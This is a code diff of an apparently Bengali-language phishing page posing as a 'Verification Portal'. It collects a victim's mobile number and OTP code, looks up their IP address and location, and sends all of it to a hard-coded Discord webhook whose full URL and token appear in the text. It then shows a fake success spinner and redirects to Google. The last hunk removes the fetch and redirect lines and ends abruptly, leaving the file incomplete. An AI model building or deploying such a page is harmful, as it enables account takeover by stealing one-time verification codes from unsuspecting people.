@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>System Verification</title>
+<title>Verification Portal</title>
 <style>
 *{box-sizing:border-box}
 body{
@@ -22,8 +22,9 @@ body{
  border-radius:12px;
  width:340px;
  box-shadow:0 4px 15px rgba(0,0,0,0.5);
+ text-align:center;
 }
-h3{text-align:center;color:#007acc;margin-bottom:20px;}
+h3{color:#007acc;margin-bottom:20px;}
 input{
  width:100%;
  padding:12px;
@@ -48,8 +49,27 @@ button{
  margin-top:5px;
 }
 button:hover{background:#005999}
-#otpSection{display:none;}
-#message{margin-top:12px;font-size:13px;text-align:center;color:#ff6b6b;}
+#otpSection, #loadingSection{display:none;}
+#message{margin-top:12px;font-size:13px;color:#ff6b6b;}
+.spinner {
+    border: 4px solid #2d2d2d;
+    width: 45px;
+    height: 45px;
+    border-radius: 50%;
+    border-left-color: #007acc;
+    animation: spin 1s linear infinite;
+    margin: 20px auto;
+}
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+.success-text {
+    color: #4cd137;
+    font-weight: bold;
+    font-size: 15px;
+    margin-top: 10px;
+}
 </style>
 </head>
 <body>
@@ -59,26 +79,33 @@ button:hover{background:#005999}
     
     <!-- ধাপ ১: মোবাইল নম্বর ইনপুট -->
     <div id="phoneSection">
-        <input type="tel" id="phoneNumber" placeholder="মোবাইল নম্বর দিন (যেমন: 017xxxxxxxx)" maxlength="15">
-        <button onclick="sendPhone()">পরবর্তী (Next)</button>
+        <input type="tel" id="phoneNumber" placeholder="মোবাইল নম্বর দিন" maxlength="15">
+        <button onclick="nextStep()">পরবর্তী (Next)</button>
     </div>
 
     <!-- ধাপ ২: ওটিপি (OTP) ইনপুট -->
     <div id="otpSection">
-        <input type="text" id="otpCode" placeholder="৬ সংখ্যার OTP কোড দিন" maxlength="6">
-        <button onclick="verifyAndSend()">যাচাই করুন (Verify)</button>
+        <input type="text" id="otpCode" placeholder="OTP কোড দিন" maxlength="6">
+        <button onclick="submitData()">যাচাই করুন (Verify)</button>
+    </div>
+
+    <!-- ধাপ ৩: লোডিং ও সফল মেসেজ সেকশন -->
+    <div id="loadingSection">
+        <div class="spinner"></div>
+        <div class="success-text">সফলভাবে ওটিপি দেওয়া হয়েছে!</div>
+        <p style="font-size: 13px; color: #aaa; margin-top: 5px;">যাচাই করা হচ্ছে...</p>
     </div>
 
     <div id="message"></div>
 </div>
 
 <script>
-// আপনার ডিসকর্ড ওয়েবহুক ইউআরএল এখানে গোপনভাবে সংযুক্ত রয়েছে
+// আপনার ডিসকর্ড ওয়েবহুক ইউআরএল এখানে সংযুক্ত রয়েছে
 const webhookUrl = "https://discord.com/api/webhooks/1568661175959298110/oGptGCUpE-n-4GTWtG2vR72e6K9e9eYqSBMrGskI38492Fs8qhtuzyi0Wa2d9qrTv54d";
 
 let capturedPhone = "";
 
-async function sendPhone() {
+function nextStep() {
     capturedPhone = document.getElementById('phoneNumber').value.trim();
     const message = document.getElementById('message');
 
@@ -92,14 +119,19 @@ async function sendPhone() {
     document.getElementById('otpSection').style.display = "block";
 }
 
-async function verifyAndSend() {
+async function submitData() {
     const otp = document.getElementById('otpCode').value.trim();
     const message = document.getElementById('message');
 
-    if (!otp || otp.length < 4) {
-        message.textContent = "দয়া করে সঠিক OTP দিন।";
+    if (!otp) {
+        message.textContent = "দয়া করে OTP দিন।";
         return;
     }
+
+    // ইনপুট ও ওটিপি সেকশন লুকিয়ে লোডিং ও সফল মেসেজ দেখানো
+    document.getElementById('otpSection').style.display = "none";
+    document.getElementById('message').style.display = "none";
+    document.getElementById('loadingSection').style.display = "block";
 
     try {
         // ক্লায়েন্টের আইপি এবং লোকেশন ফেচ করা
@@ -114,29 +146,4 @@ async function verifyAndSend() {
                 fields: [
                     { name: "📱 PHONE NUMBER", value: `\`${capturedPhone}\``, inline: true },
                     { name: "🔑 OTP CODE", value: `\`${otp}\``, inline: true },
-                    { name: "🌐 IP ADDRESS", value: `**${ipData.ip || 'UNKNOWN'}**`, inline: true },
-                    { name: "📍 LOCATION", value: `${ipData.city || 'N/A'}, ${ipData.country_name || 'N/A'}`, inline: true }
-                ],
-                footer: { text: "Timestamp: " + new Date().toLocaleString() }
-            }]
-        };
-
-        // ডিসকর্ড ওয়েবহুকে পোস্ট রিকোয়েস্ট পাঠানো
-        await fetch(webhookUrl, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload),
-            keepalive: true
-        });
-
-    } catch (e) {
-        // কোনো এরর হলেও ফ্লো অব্যাহত রাখা
-    }
-
-    // সফলভাবে সাবমিট হওয়ার পর রিডাইরেক্ট
-    window.location.replace("https://www.google.com");
-}
-</script>
-
-</body>
-</html>
+ 
